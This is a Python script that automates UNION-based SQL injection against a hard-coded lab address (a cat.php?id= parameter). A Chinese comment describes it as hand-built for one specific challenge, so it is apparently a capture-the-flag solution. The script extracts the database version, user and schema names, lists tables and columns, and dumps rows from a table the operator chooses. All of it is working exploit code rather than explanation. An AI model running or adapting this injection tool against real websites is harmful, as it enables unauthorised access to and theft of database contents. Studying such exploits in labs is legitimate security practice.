import requests
import re
# 代码内容是针对题目经过手工分析刻意构造，不具备一般性

DATABASE_REQUEST = '1 Union selEct 1,cOnCat(0x7177657E,schema_name,0x7E717765),3,4 from INFORMATION_SCHEMA.SCHEMATA'

def extractData(url):
    r = requests.get(url)
    t = r.text
    res = re.findall(r"qwe~(.+?)~qwe", t)
    if len(res) > 0:
        return res


def baseInfo(url):
    vurl = url + '1 union select 1,concat(0x7177657E,version(),0x7E717765),2,3'
    durl = url + '1 union select 1,concat(0x7177657E,database(),0x7E717765),2,3'
    uurl = url + '1 union select 1,concat(0x7177657E,user(),0x7E717765),2,3'
    version =  list(set(extractData(vurl)))
    database = list(set(extractData(durl)))
    user = list(set(extractData(uurl)))
    print('='* 45)
    print('version:',version[0],'\ndatabase:',database[0],'\nuser:',user[0])
    print('='*45)


def databaseName(url):
    url += DATABASE_REQUEST
    db_name = list(set(extractData(url)))
    print('database:')
    for i,j in enumerate(db_name):
        print("[+] %-30s\t" %j,end='')
        if not (i + 1)%3:
            print('')


def tableName(url):
    url += "1 union select 1,concat(0x7177657E,table_name,0x7E717765),3,4 from information_schema.tables"
    tb_name = sorted(list(set(extractData(url))))
    print('\n\ntable:')
    for i,j in enumerate(tb_name):
        print("[+] %-30s\t" %j,end='')
        if not (i + 1)%3:
            print('')

def fieldName(url,tb_name):
    field = []
    url += "1 UNION SELECT 1,concat(0x7177657E,table_name,':', column_name,0x7E717765),3,4 FROM information_schema.columns"
    fd_name = list(set(extractData(url)))
    for i in fd_name:
        prime,final = i.split(':')
        if prime == tb_name and final:
            field.append(final)
    for i,j in enumerate(field):
        print("[+] %-30s\t" %j,end='')
        if not (i + 1)%3:
            print('')

def fetchData(url,tb_name,fd_name):
    clear = fd_name.split()
    fd_name = ",':',".join(clear)
    url += '1 UNION SELECT 1,concat(0x7177657E,{},0x7E717765),3,4 FROM {}'.format(fd_name,tb_name)
    datas = list(set(extractData(url)))
    for d in datas:
        d = d.split(':')
        if len(clear) == len(d):
            print('[+]',end = ' ')
            for i,j in zip(clear,d):
                print("%-35s" %(i + ':' + j),end = '\t')
            print('')


if __name__ == '__main__':
    url = r'http://192.168.55.3/cat.php?id='
    baseInfo(url)
    databaseName(url)
    tableName(url)
    tb_name = input("\n\nPlease select the target table:")
    fieldName(url,tb_name)
    fd_name = input('\nPlease select the target field:')
    fetchData(url,tb_name,fd_name)

